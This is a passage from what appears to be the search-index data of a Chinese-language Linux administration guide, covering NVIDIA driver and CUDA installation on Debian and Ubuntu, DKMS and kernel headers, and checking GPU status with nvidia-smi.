\u200b\u5e94\u7528\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u786e\u4fdd\u200b\u5b89\u88c5\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u5e76\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u9700\u6c42\u200b\u5b89\u88c5\u200b CUDA \u200b\u7ec4\u4ef6\u200b\u3002</p>"},{"location":"advanced/cuda/#configure-cuda","title":"\u914d\u7f6e\u200b CUDA \u200b\u73af\u5883","text":""},{"location":"advanced/cuda/#cuda-version","title":"\u7248\u672c\u200b\u51c6\u5907","text":"<p>\u200b\u5728\u200b\u5f00\u59cb\u200b\u4e4b\u524d\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u663e\u5361\u200b\u662f\u5426\u200b\u652f\u6301\u200b CUDA\u3002\u200b\u5728\u200b\u8fd9\u91cc\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u652f\u6301\u200b\u7684\u200b\u5217\u8868\u200b\uff1ahttps://developer.nvidia.com/CUDA-gpus\u3002</p> <p>\u200b\u8868\u4e2d\u200b\u7684\u200b <code>Compute Capability</code> \u200b\u4ee3\u8868\u200b\u8ba1\u7b97\u80fd\u529b\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u8868\u660e\u200b\u4e86\u200b GPU \u200b\u652f\u6301\u200b\u7684\u200b CUDA \u200b\u7279\u6027\u200b\u548c\u200b\u6307\u4ee4\u96c6\u200b\u7248\u672c\u200b\u3002\u200b\u67b6\u6784\u200b\u8d8a\u65b0\u200b\u7684\u200b\u663e\u5361\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8ba1\u7b97\u80fd\u529b\u200b\u6570\u5b57\u200b\u8d8a\u9ad8\u200b\u3002\u200b\u4f7f\u7528\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u652f\u6301\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8ba1\u7b97\u80fd\u529b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u6b64\u8868\u200b\uff1ahttps://docs.nvidia.com/datacenter/tesla/drivers/index.html#cuda-arch-matrix\u3002\u200b\u540c\u65f6\u200b\uff0cCUDA \u200b\u4e5f\u200b\u5bf9\u7cfb\u7edf\u200b\u7f16\u8bd1\u5668\u200b\u7248\u672c\u200b\u6709\u200b\u8981\u6c42\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u6b64\u8868\u200b\uff1ahttps://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html#system-requirements\u3002</p>"},{"location":"advanced/cuda/#nvidia-driver","title":"\u5b89\u88c5\u200b NVIDIA \u200b\u9a71\u52a8","text":"<p>NVIDIA \u200b\u5185\u6838\u200b\u9a71\u52a8\u200b</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cLinux \u200b\u5185\u6838\u200b\u81ea\u5e26\u200b\u5f00\u6e90\u200b\u7684\u200b Nouveau \u200b\u9a71\u52a8\u200b\u3002Nouveau \u200b\u9a71\u52a8\u200b\u5927\u90e8\u5206\u200b\u65f6\u5019\u200b\u80fd\u591f\u200b\u70b9\u4eae\u200b\u5c4f\u5e55\u200b\uff0c\u200b\u8fdb\u884c\u200b\u57fa\u7840\u200b\u7684\u200b\u56fe\u5f62\u200b\u6e32\u67d3\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u6ca1\u6709\u200b\u8ba1\u7b97\u200b\u548c\u200b\u91cd\u5ea6\u200b\u6e32\u67d3\u200b\u9700\u6c42\u200b\uff08\u200b\u4f8b\u5982\u200b\u5927\u578b\u200b\u6e38\u620f\u200b\uff09\u200b\u7684\u200b\u7528\u6237\u200b\u6765\u8bb2\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u7684\u200b\u9009\u62e9\u200b<sup>1</sup>\u3002\u200b\u4f46\u662f\u200b\u5f88\u200b\u9057\u61be\u200b\uff0cNouveau \u200b\u4e0d\u200b\u652f\u6301\u200b\u8fd0\u884c\u200b\u5305\u62ec\u200b CUDA \u200b\u5728\u5185\u200b\u7684\u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b<sup>2</sup>\u3002</p> <p>\u200b\u5f88\u957f\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u5185\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u5bf9\u200b\u684c\u9762\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\uff0cNVIDIA \u200b\u7684\u200b\u9a71\u52a8\u200b\u5b89\u88c5\u200b\u4e00\u76f4\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5934\u75bc\u200b\uff08\u200b\u751a\u81f3\u200b\u8ba9\u200b\u4eba\u200b\u60f3\u200b\u9a82\u4eba\u200b\uff09\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u5c3d\u7ba1\u200b NVIDIA \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u95ed\u6e90\u200b\u9a71\u52a8\u200b\uff0c\u200b\u4f46\u662f\u200b\u6070\u5f53\u200b\u5730\u200b\u5b89\u88c5\u200b\u4e0e\u200b\u914d\u7f6e\u200b\u4e5f\u200b\u4e0d\u662f\u200b\u5f88\u200b\u5bb9\u6613\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u8fd1\u5e74\u6765\u200b\uff0cNVIDIA \u200b\u63a8\u51fa\u200b\u7684\u200b\u65b0\u200b\u663e\u5361\u200b\u4e0a\u200b\u6dfb\u52a0\u200b\u4e86\u200b GSP \u200b\u82af\u7247\u200b\uff0c\u200b\u80fd\u591f\u200b\u627f\u8f7d\u200b NVIDIA \u200b\u4e0d\u200b\u613f\u610f\u200b\u516c\u5f00\u200b\u7684\u200b\u529f\u80fd\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u56e0\u6b64\u200b NVIDIA \u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u81ea\u5df1\u200b\u7684\u200b\u300c\u200b\u5f00\u6e90\u200b\u9a71\u52a8\u200b\u300d\u3002\u200b\u5c3d\u7ba1\u200b\u8fd9\u4e2a\u200b\u9a71\u52a8\u200b\u5b9e\u73b0\u200b\u6709\u200b\u53ef\u80fd\u200b\u6c38\u8fdc\u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u5728\u200b Linux \u200b\u5185\u6838\u200b\u7684\u200b\u4e3b\u7ebf\u200b\u4ee3\u7801\u200b\u91cc\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u671f\u671b\u200b\u5176\u200b\u81f3\u5c11\u200b\u80fd\u591f\u200b\u51cf\u5c11\u200b\u4e0d\u5c11\u200b\u9ebb\u70e6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e3a\u200b NVIDIA GPU \u200b\u8fd0\u884c\u200b\u5728\u200b\u8bf8\u5982\u200b RISC-V \u200b\u7b49\u200b\u65b0\u200b\u67b6\u6784\u200b\u7684\u200b\u673a\u5668\u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u652f\u6301\u200b\u3002\u200b\u5f53\u7136\u200b\uff0cNVIDIA \u200b\u7684\u200b\u7528\u6237\u200b\u6001\u200b\u9a71\u52a8\u200b\u4ecd\u7136\u200b\u662f\u200b\u4e0d\u200b\u5f00\u6e90\u200b\u7684\u200b\u3002</p> <p>\u200b\u786e\u8ba4\u200b\u662f\u5426\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u8fc7\u200b NVIDIA \u200b\u9a71\u52a8\u200b</p> <p>\u200b\u4f7f\u7528\u200b <code>cat /proc/driver/nvidia/version</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u786e\u8ba4\u200b\u662f\u5426\u200b\u5b89\u88c5\u200b\u4e86\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u3002\u200b\u5982\u679c\u200b\u5df2\u200b\u5b89\u88c5\u200b\u5219\u200b\u663e\u793a\u200b\u7248\u672c\u53f7\u200b\u3002</p> <p>\u200b\u603b\u7684\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\uff0cNVIDIA \u200b\u9a71\u52a8\u200b\u4e0e\u200b CUDA \u200b\u7684\u200b\u5b89\u88c5\u200b\u65b9\u5f0f\u200b\u5927\u81f4\u200b\u5206\u4e3a\u200b\uff1a</p> <ol> <li> <p>\u200b\u4f7f\u7528\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u672c\u8eab\u200b\u7684\u200b\u4ed3\u5e93\u200b\u548c\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u8fdb\u884c\u200b\u5b89\u88c5\u200b\uff08\u200b\u63a8\u8350\u200b\uff09\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>Debian Wiki</li> <li>Ubuntu Server Guide</li> <li>Arch Wiki</li> </ul> <p>\u200b\u5bf9\u4e8e\u200b\u90e8\u5206\u200b\u4e0d\u200b\u88ab\u200b NVIDIA \u200b\u5b98\u65b9\u200b\u652f\u6301\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\uff08\u200b\u4f8b\u5982\u200b Arch Linux\uff09\uff0c\u200b\u4f7f\u7528\u200b\u53d1\u884c\u7248\u200b\u81ea\u884c\u200b\u6253\u5305\u200b\u7684\u200b\u7248\u672c\u200b\u662f\u200b\u552f\u4e00\u200b\u63a8\u8350\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002</p> </li> <li> <p>\u200b\u4f7f\u7528\u200b NVIDIA \u200b\u63d0\u4f9b\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\uff0c\u200b\u5e76\u7528\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u8fdb\u884c\u200b\u5b89\u88c5\u200b\u3002</p> </li> <li> <p>\u200b\u4f7f\u7528\u200b\u5b98\u65b9\u200b runfile \u200b\u4e00\u952e\u200b\u5b89\u88c5\u200b\uff08\u200b\u4e0d\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\u6b64\u200b\u65b9\u6cd5\u200b\u5b89\u88c5\u200b\u9a71\u52a8\u200b\uff09     </p> <ul> <li>\u200b\u4f7f\u7528\u200b\u5b98\u65b9\u200b runfile \u200b\u4e00\u952e\u200b\u5b89\u88c5\u200b\u7684\u200b\u65b9\u5f0f\u200b\u8f83\u4e3a\u200b\u7e41\u7410\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5176\u200b\u5728\u200b\u5b89\u88c5\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u4f1a\u200b\u8986\u76d6\u200b\u7531\u200b\u7cfb\u7edf\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\u7ba1\u7406\u200b\u7684\u200b\u67d0\u4e9b\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7834\u574f\u200b\u7cfb\u7edf\u200b\u3002\u200b\u7279\u522b\u200b\u662f\u200b\u5728\u200b\u7cfb\u7edf\u5347\u7ea7\u200b\u5185\u6838\u200b\u6216\u200b Xorg \u200b\u7248\u672c\u200b\u65f6\u200b\uff0c\u200b\u4f7f\u7528\u200b runfile \u200b\u5b89\u88c5\u200b\u7684\u200b\u9a71\u52a8\u200b\u975e\u5e38\u5bb9\u6613\u200b\u5bfc\u81f4\u200b\u65e0\u6cd5\u200b\u542f\u52a8\u200b\u6216\u662f\u200b\u65e0\u6cd5\u200b\u8fdb\u5165\u200b\u56fe\u5f62\u754c\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\u3002\u200b\u9664\u975e\u200b\u4f60\u200b\u5b8c\u5168\u200b\u6e05\u695a\u200b\u76f8\u5173\u200b\u95ee\u9898\u200b\u4e0e\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u8981\u200b\u4f7f\u7528\u200b runfile\uff08.run \u200b\u6587\u4ef6\u200b\uff09\u200b\u5b89\u88c5\u200b\u9a71\u52a8\u200b\u3002</li> </ul> </li> </ol> <p>\u200b\u5bf9\u4e8e\u200b\u540e\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5b98\u7f51\u200b\u4e0b\u8f7d\u200b\u9875\u9762\u200b https://developer.nvidia.com/CUDA-downloads \u200b\u9009\u62e9\u200b\u5408\u9002\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\uff0c\u200b\u7f51\u9875\u200b\u5c06\u200b\u7ed9\u51fa\u200b\u5bf9\u5e94\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u5b89\u88c5\u200b\u6307\u4ee4\u200b\u3002\u200b\u5176\u4e2d\u200b \"Install Type\" \u200b\u4e2d\u200b local \u200b\u4ee3\u8868\u200b\u5b89\u88c5\u5305\u200b\u5305\u542b\u200b\u4e86\u200b\u5b8c\u6574\u200b\u7684\u200b CUDA \u200b\u8fd0\u884c\u200b\u65f6\u200b\u548c\u200b\u76f8\u5173\u9a71\u52a8\u200b\uff0c\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u200b\u4ece\u200b\u672c\u5730\u200b\u83b7\u53d6\u200b\uff1b\u200b\u800c\u200b network \u200b\u5355\u7eaf\u200b\u53ea\u200b\u5305\u542b\u200b\u4e86\u200b\u6e90\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7531\u5305\u200b\u7ba1\u7406\u5668\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u200b\u8054\u7f51\u200b\u83b7\u53d6\u200b\u3002\"runfile (local)\" \u200b\u5219\u200b\u662f\u200b\u4e0a\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b\u7b2c\u4e09\u79cd\u200b\u4e0d\u200b\u63a8\u8350\u200b\u7684\u200b\u5b89\u88c5\u200b\u65b9\u5f0f\u200b\u3002\u200b\u53e6\u5916\u200b\uff0c\u200b\u65e7\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u9700\u8981\u200b\u5728\u200b CUDA Toolkit Archive \u200b\u4e2d\u200b\u67e5\u627e\u200b\u3002</p> <p>\u200b\u4e0d\u662f\u200b\u5b89\u88c5\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u5417\u200b\uff1f\u200b\u4e3a\u4ec0\u4e48\u200b\u5728\u200b CUDA \u200b\u4e0b\u8f7d\u200b\u9875\u9762\u200b\uff1f</p> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b\u300cCUDA \u200b\u4e0b\u8f7d\u200b\u300d\u200b\u5b9e\u9645\u4e0a\u200b\u4e0b\u8f7d\u200b\u7684\u200b\u662f\u200b NVIDIA \u200b\u9a71\u52a8\u200b + CUDA \u200b\u5f00\u53d1\u200b\u73af\u5883\u200b\u3002\u200b\u5373\u4f7f\u200b\u4e0d\u200b\u60f3\u8981\u200b CUDA\uff0c\u200b\u5176\u200b\u8f6f\u4ef6\u200b\u4ed3\u5e93\u200b\u4e5f\u200b\u5305\u542b\u200b\u4e86\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u7684\u200b\u5b89\u88c5\u5305\u200b\u3002\u200b\u540c\u65f6\u200b\uff0cCUDA \u200b\u5f00\u53d1\u200b\u73af\u5883\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5176\u4ed6\u200b\u7684\u200b\u65b9\u5f0f\u200b\uff08\u200b\u4f8b\u5982\u200b\u4ece\u200b PyPI \u200b\u6216\u200b Conda\uff09\u200b\u83b7\u53d6\u200b\u3002</p> <p>\u200b\u5728\u200b\u5b89\u88c5\u200b\u65f6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9700\u8981\u200b\u9009\u62e9\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u7684\u200b\u7248\u672c\u200b\u3002\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u9700\u6c42\u200b\uff0c\u200b\u9009\u62e9\u200b\u6700\u65b0\u200b\u7684\u200b\u7248\u672c\u200b\u5373\u53ef\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65e7\u200b\u7684\u200b\u9a71\u52a8\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u652f\u6301\u200b\u65b0\u200b\u7248\u672c\u200b\u7684\u200b CUDA \u200b\u4e0e\u200b\u663e\u5361\u200b\u3002\u200b\u8be6\u60c5\u200b\u89c1\u200b\u7248\u672c\u200b\u5173\u7cfb\u200b\u8bf4\u660e\u200b\u3002</p> <p>Linux \u200b\u5934\u6587\u4ef6\u200b\uff0c\u200b\u4e0e\u200b DKMS</p> <p>NVIDIA \u200b\u9a71\u52a8\u200b\u5c3d\u7ba1\u200b\u662f\u200b\u95ed\u6e90\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u5176\u200b\u4ecd\u7136\u200b\u5305\u542b\u200b\u4e00\u90e8\u5206\u200b\u5f00\u6e90\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5728\u200b\u5185\u6838\u200b\u548c\u200b\u95ed\u6e90\u200b\u9a71\u52a8\u200b\u4e4b\u95f4\u200b\u4ea4\u4e92\u200b\uff08\u200b\u8fd9\u200b\u4e00\u90e8\u5206\u200b\u4ee3\u7801\u200b\u4e5f\u200b\u88ab\u200b\u620f\u79f0\u200b\u4e3a\u200b \"GPL condom\"\uff09\u3002\u200b\u7531\u4e8e\u200b\u4e0d\u540c\u200b\u7248\u672c\u200b\u7684\u200b\u5185\u6838\u200b\u7684\u200b ABI \u200b\u4e0d\u200b\u517c\u5bb9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u66f4\u6362\u200b\u5185\u6838\u200b\u540e\u200b\u5c31\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u7f16\u8bd1\u200b\u9a71\u52a8\u200b\u3002DKMS\uff08Dynamic Kernel Module Support\uff09\u200b\u4f1a\u200b\u5e2e\u52a9\u200b\u5728\u200b\u5185\u6838\u200b\u66f4\u65b0\u200b\u540e\u200b\u81ea\u52a8\u200b\u91cd\u65b0\u200b\u7f16\u8bd1\u200b\u9a71\u52a8\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u7f16\u8bd1\u200b\u9a71\u52a8\u200b\u8fd8\u200b\u9700\u8981\u200b\u5185\u6838\u200b\u5934\u6587\u4ef6\u200b\uff0c\u200b\u5426\u5219\u200b DKMS \u200b\u4f1a\u200b\u8df3\u200b\u8fc7\u200b\u7f16\u8bd1\u200b\u3002</p> <p>\u200b\u5bf9\u200b Ubuntu \u200b\u6765\u8bf4\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b\u7684\u200b\u5185\u6838\u200b\u4e3a\u200b \"generic\"\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5185\u6838\u200b\u5305\u4e3a\u200b <code>linux-image-generic</code>\uff0c\u200b\u5934\u6587\u4ef6\u200b\u5219\u200b\u4e3a\u200b <code>linux-headers-generic</code>\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u5176\u4ed6\u200b\u5185\u6838\u200b\uff08\u200b\u4f8b\u5982\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u4f7f\u7528\u200b <code>linux-image-virtual</code>\uff09\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5934\u6587\u4ef6\u200b\u5305\u200b\u3002\u200b\u800c\u200b\u9ed8\u8ba4\u200b\u7684\u200b Debian \u200b\u5219\u200b\u5206\u522b\u200b\u662f\u200b <code>linux-image-amd64</code> \u200b\u548c\u200b <code>linux-headers-amd64</code>\u3002\u200b\u67d0\u4e9b\u200b\u65f6\u5019\u200b\u5934\u6587\u4ef6\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u7b2c\u4e00\u79cd\u200b\u5b89\u88c5\u200b\u65b9\u5f0f\u200b\uff0cUbuntu \u200b\u548c\u200b Debian \u200b\u90fd\u200b\u63d0\u4f9b\u200b\u4e86\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u7684\u200b\u5143\u200b\u5305\u200b\uff08metapackage\uff09\uff0c\u200b\u5305\u542b\u200b\u4e86\u200b\u6240\u6709\u200b\u9700\u8981\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>Ubuntu \u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt list</code> \u200b\u67e5\u627e\u200b\u5f53\u524d\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u63d0\u4f9b\u200b\u7684\u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\uff1a</p> <pre><code>$ apt list 'nvidia-driver-*'\nListing... Done\nnvidia-driver-460-server/noble 470.239.06-0ubuntu2 amd64\nnvidia-driver-460/noble 470.239.06-0ubuntu2 amd64\nnvidia-driver-465/noble 470.239.06-0ubuntu2 amd64\nnvidia-driver-470-server/noble 470.239.06-0ubuntu2 amd64\nnvidia-driver-470/noble 470.239.06-0ubuntu2 amd64\nnvidia-driver-510/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-515-open/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-515-server/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-515/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-520-open/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-520/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-525-open/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-525-server/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-525/noble 525.147.05-0ubuntu2 amd64\nnvidia-driver-530-open/noble 535.171.04-0ubuntu2 amd64\nnvidia-driver-530/noble 535.171.04-0ubuntu2 amd64\nnvidia-driver-535-open/noble 535.171.04-0ubuntu2 amd64\nnvidia-driver-535-server-open/noble 535.161.08-0ubuntu2 amd64\nnvidia-driver-535-server/noble 535.161.08-0ubuntu2 amd64\nnvidia-driver-535/noble 535.171.04-0ubuntu2 amd64\nnvidia-driver-550-open/noble 550.67-0ubuntu3 amd64\nnvidia-driver-550-server-open/noble 550.54.15-0ubuntu2 amd64\nnvidia-driver-550-server/noble 550.54.15-0ubuntu2 amd64\nnvidia-driver-550/noble 550.67-0ubuntu3 amd64\n</code></pre> <p>Debian \u200b\u5219\u200b\u53ea\u200b\u5305\u542b\u200b\u4e86\u200b <code>nvidia-driver</code> \u200b\u5305\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u53d1\u884c\u7248\u200b\u53d1\u5e03\u200b\u65f6\u200b\u6700\u65b0\u200b\u7684\u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\uff0c\u200b\u540c\u65f6\u200b\u5bf9\u4e8e\u200b stable \u200b\u53d1\u884c\u7248\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4ece\u200b backports \u200b\u4ed3\u5e93\u200b\u4e2d\u200b\u83b7\u53d6\u200b\u66f4\u65b0\u200b\u7684\u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\uff0c\u200b\u8be6\u60c5\u8bf7\u200b\u53c2\u8003\u200b\u4e0a\u6587\u200b\u63d0\u4f9b\u200b\u7684\u200b Debian Wiki\u3002</p>"},{"location":"advanced/cuda/#check-gpu-status","title":"\u67e5\u770b\u200b\u663e\u5361\u200b\u72b6\u6001","text":""},{"location":"advanced/cuda/#nvidia-smi","title":"<code>nvidia-smi</code>","text":"<p><code>nvidia-smi</code> \u200b\u7531\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u63d0\u4f9b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u7cfb\u7edf\u200b\u4e2d\u200b NVIDIA GPU \u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b\u9a71\u52a8\u200b\u7248\u672c\u200b\u4e0e\u200b\u652f\u6301\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u3001GPU \u200b\u7684\u200b\u6e29\u5ea6\u200b\u3001\u200b\u529f\u8017\u200b\u3001\u200b\u5185\u5b58\u200b\u4f7f\u7528\u200b\u3001\u200b\u5229\u7528\u7387\u200b\u3001\u200b\u662f\u5426\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\u7b49\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b GPU \u200b\u7684\u200b\u8fdb\u7a0b\u200b\u4fe1\u606f\u200b\u3002</p> <pre><code>$ nvidia-smi\nWed Jul 30 02:25:00 2025\n+---------------------------------------------------------------------------------------+\n| NVIDIA-SMI 535.216.01             Driver Version: 535.216.01   CUDA Version: 12.2     |\n|-----------------------------------------+----------------------+----------------------+\n| GPU  Name                 Persistence-M | Bus-Id        Disp.A | Volatile Uncorr. ECC |\n| Fan  Temp   Perf          Pwr:Usage/Cap |         Memory-Usage | GPU-Util  Compute M. |\n|                                         |                      |               MIG M. |\n|=========================================+======================+======================|\n|   0  Tesla T4                       On  | 00000000:00:08.0 Off |                    0 |\n| N/A   52C    P0              68W /  70W |    107MiB / 15360MiB |    100%      Default |\n|                                         |                      |                  N/A |\n+-----------------------------------------+----------------------+----------------------+\n\n+---------------------------------------------------------------------------------------+\n| Processes:                                                                            |\n|  GPU   GI   CI        PID   Type   Process name                            GPU Memory |\n|        ID   ID                                                             Usage      |\n|=======================================================================================|\n|    0   N/A  N/A     48645      C   ./minute_payload                            102MiB |\n+---------------------------------------------------------------------------------------+\n</code></pre> <p>\u200b\u5982\u679c\u200b\u80fd\u591f\u200b\u67e5\u770b\u200b\u5230\u200b\u4f60\u200b\u7684\u200b\u663e\u5361\u200b\uff0c\u200b\u90a3\u4e48\u200b\u606d\u559c\u200b\u4f60\u200b\uff0c\u200b\u663e\u5361\u200b\u5df2\u7ecf\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e86\u200b\u3002</p> <p>CUDA Version</p> <p><code>nvidia-smi</code> \u200b\u754c\u9762\u200b\u53f3\u4e0a\u89d2\u200b\u663e\u793a\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u662f\u200b\u6307\u200b\u5f53\u524d\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u5b89\u88c5\u200b\u7684\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u652f\u6301\u200b\u7684\u200b\u6700\u9ad8\u200b CUDA \u200b\u7248\u672c\u200b\uff0c\u200b\u5e76\u200b\u4e0d\u662f\u200b\u5df2\u200b\u5b89\u88c5\u200b\u7684\u200b CUDA \u200b\u7248\u672c\u200b\u2014\u2014\u200b\u6bd4\u200b\u663e\u793a\u200b\u7248\u672c\u200b\u4f4e\u200b\u7684\u200b CUDA \u200b\u4e5f\u200b\u662f\u200b\u80fd\u591f\u200b\u6b63\u5e38\u200b\u4f7f\u7528\u200b\u7684\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u89c2\u5bdf\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u7684\u200b GPU \u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--loop</code> \u200b\u53c2\u6570\u200b\uff1a</p> <pre><code># \u200b\u6bcf\u9694\u200b 2s \u200b\u8f93\u51fa\u200b\u4e00\u6b21\u200b\nnvidia-smi --loop=2\n</code></pre> <p>nvidia-smi \u200b\u7684\u200b\u989d\u5916\u200b\u5f00\u9500\u200b</p> <p>\u200b\u9891\u7e41\u200b\u83b7\u53d6\u200b\u7edf\u8ba1\u200b\u4fe1\u606f\u200b\u662f\u200b\u6709\u200b\u989d\u5916\u200b\u5f00\u9500\u200b\u7684\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bf9\u200b GPU \u200b\u7684\u200b\u6027\u80fd\u200b\u4ea7\u751f\u200b\u5f71\u54cd\u200b\u3002\u200b\u56e0\u6b64\u200b\u5efa\u8bae\u200b\u95f4\u9694\u65f6\u95f4\u200b\u4e0d\u8981\u200b\u8bbe\u7f6e\u200b\u5f97\u200b\u592a\u5c0f\u200b\u2014\u2014\u200b\u9ed8\u8ba4\u200b\u7684\u200b 5s \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u5408\u9002\u200b\u7684\u200b\u503c\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>--query</code> \u200b\u76f8\u5173\u200b\u53c2\u6570\u200b\u4ee5\u53ca\u200b <code>--format</code> \u200b\u53c2\u6570\u200b\u67e5\u8be2\u200b\u6307\u5b9a\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8f93\u51fa\u200b\u4e3a\u200b 